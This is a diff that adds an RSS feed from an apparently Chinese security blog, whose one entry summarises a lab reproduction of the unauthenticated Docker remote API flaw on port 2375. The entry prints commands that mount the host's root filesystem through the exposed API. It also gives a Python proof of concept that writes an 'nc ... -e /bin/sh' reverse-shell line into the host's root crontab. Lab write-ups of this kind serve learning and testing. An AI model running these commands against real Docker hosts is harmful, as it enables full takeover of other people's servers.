@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>漏洞复现 on 爆肚的杂货铺</title>
+    <link>https://b40du.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+    <description>Recent content in 漏洞复现 on 爆肚的杂货铺</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>This is a customized copyright.</copyright>
+    <lastBuildDate>Wed, 08 Jul 2020 23:55:11 +0800</lastBuildDate>
+    
+	<atom:link href="https://b40du.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Docker Daemon Api 未授权访问漏洞复现</title>
+      <link>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</link>
+      <pubDate>Wed, 08 Jul 2020 23:55:11 +0800</pubDate>
+      
+      <guid>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</guid>
+      <description>1. 漏洞描述 Docker是一种开源的应用容器引擎，由于权限设置不当以及端口暴露在外网等原因，可以利用该漏洞访问Docker对外开放的一个API接口，进行远程命令执行。
+2. 漏洞成因 Docker在使用集群管理（如：Kubernetes，swarm）时，要使用remote api对节点进行管理，remote api无认证时的默认端口是2375（需要TLS认证默认登录是2376）。
+而remote api默认是可以不需要认证能直接访问，能直接对Docker进行操作，如新建容器，删除容器，查看镜像容器信息等等。
+3. 漏洞复现 3.1 进入vulhub漏洞目录，启动漏洞环境 3.2 探测2375端口 如果是公网的其他主机，我们需要探测2375端口。
+由于是靶场搭建漏洞环境，在这里我们直接访问http://youer-vps-ip:2375/version请求，如果返回包带有json格式，说明存在该漏洞。
+3.3 利用漏洞查看镜像、创造容器 在远程vps中，构造如下poc，进行测试：
+docker -H=tcp://your-vps-ip:2375 images 然后我们新建一个容器，并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下，然后使用ls命令查看。
+docker -H=tcp://your-vps-ip:2375 run -it -v /:/tmp --entrypoint /bin/sh alpine:latest 然后使用命令查看所有的容器。
+docker -H=tcp://your-vps-ip:2375 ps -a 3.4 利用漏洞反弹shell 我们启动一个容器，并将宿主机的/etc目录挂载到容器中，这个时候我们便已经可以任意读写文件了。接下来我们需要做的就是将命令写入crontab配置文件，进行反弹shell。于是在自己的vps上构造如下poc：
+import docker client = docker.DockerClient(base_url=&amp;#39;http://靶场ip:2375/&amp;#39;) data = client.containers.run(&amp;#39;alpine:latest&amp;#39;, r&amp;#39;&amp;#39;&amp;#39;sh -c &amp;#34;echo &amp;#39;*/1 * * * * /usr/bin/nc your-vps-ip 7890 -e /bin/sh&amp;#39; &amp;gt;&amp;gt; /tmp/etc/crontabs/root&amp;#34; &amp;#39;&amp;#39;&amp;#39;, +=True, volumes={&amp;#39;/etc&amp;#39;: {&amp;#39;bind&amp;#39;: &amp;#39;/tmp/etc&amp;#39;, &amp;#39;mode&amp;#39;: &amp;#39;rw&amp;#39;}}) 然后同时另外开启一个控制台，使用nc监听7890端口：</description>
+    </item>
+    
+  </channel>
+</rss>
